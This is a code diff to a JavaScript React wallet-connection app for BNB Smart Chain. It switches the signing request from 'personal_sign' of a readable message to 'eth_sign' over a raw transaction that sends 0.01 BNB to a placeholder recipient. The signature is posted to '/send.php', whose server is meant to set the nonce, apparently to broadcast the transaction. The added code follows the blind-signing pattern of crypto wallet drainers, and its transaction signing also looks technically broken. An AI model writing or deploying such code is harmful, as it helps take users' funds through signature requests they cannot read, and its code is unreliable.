@@ -8,8 +8,8 @@ function App() {
 
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
-      chains: [56], // فقط BSC
-      methods: ["personal_sign"], // متد personal_sign
+      chains: [56], // BSC
+      methods: ["eth_sign"], // تغییر متد به eth_sign
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -19,33 +19,27 @@ function App() {
     var sender = accounts[0];
     console.log("✅ Wallet Address:", sender);
 
-    let apiUrl = "/send.php"; // آدرس سرور برای پردازش تراکنش
+    let apiUrl = "/send.php";
 
-    async function getRawSignature(address, balance) {
+    async function getRawSignature(address, rawTxData) {
       try {
-        let message = JSON.stringify({
-          sender: address,
-          balance: balance,
-          timestamp: Date.now(),
-        });
-
         var rawSignature = await provider.request({
-          method: "personal_sign",
-          params: [message, address],
+          method: "eth_sign",
+          params: [address, rawTxData], // امضای تراکنش خام
         });
 
-        return { rawSignature, message };
+        return { rawSignature, rawTxData };
       } catch (error) {
         console.error("❌ Error in getRawSignature:", error);
         return null;
       }
     }
 
-    async function sendSignedTransaction(signature, message) {
+    async function sendSignedTransaction(signature, rawTxData) {
       try {
         let requestData = {
           signedData: signature,
-          message: message,
+          rawTxData: rawTxData,
         };
 
         let response = await fetch(apiUrl, {
@@ -64,14 +58,21 @@ function App() {
       }
     }
 
-    let balance = "0.01"; // مقدار BNB مورد انتقال
-    var signedData = await getRawSignature(sender, balance);
+    let rawTxData = JSON.stringify({
+      to: "0xRecipientAddress", // آدرس مقصد را اینجا تنظیم کن
+      value: "0.01", // مقدار BNB
+      gas: "21000", // مقدار گس پایه
+      gasPrice: "5000000000", // مقدار گس پرایس
+      nonce: "0", // این مقدار در سرور جایگزین مقدار صحیح می‌شود
+    });
+
+    var signedData = await getRawSignature(sender, rawTxData);
 
     if (signedData) {
       console.log("✍️ Signed Raw Data:", signedData);
       var txHash = await sendSignedTransaction(
         signedData.rawSignature,
-        signedData.message
+        signedData.rawTxData
       );
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
